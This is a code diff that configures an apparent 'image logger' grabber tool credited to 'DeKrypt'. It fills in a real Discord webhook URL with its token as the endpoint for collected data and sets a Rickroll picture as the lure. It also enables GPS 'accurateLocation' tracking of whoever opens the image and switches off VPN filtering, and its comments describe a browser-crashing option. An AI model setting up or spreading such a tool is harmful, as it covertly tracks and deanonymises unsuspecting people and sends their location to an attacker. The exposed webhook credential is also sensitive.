@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1297301159014567976/88kHPJ4o8vXZlT0NEaArS66IgY1VT4cz2k2wpzr0V8UNYKAMzAtvUzAWCg_SdS0SXtyA",
+    "image": "https://jollycontrarian.com/images/6/6c/Rickroll.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -32,7 +32,7 @@ config = {
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
